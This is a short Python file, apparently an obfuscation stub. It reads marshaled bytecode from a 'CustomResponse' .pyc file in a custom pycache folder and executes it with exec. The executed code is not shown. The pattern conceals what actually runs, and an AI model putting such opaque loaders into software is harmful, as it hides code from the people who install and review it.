
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'CustomResponse_23d331e417ae4c848ec3b30042b50a04.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
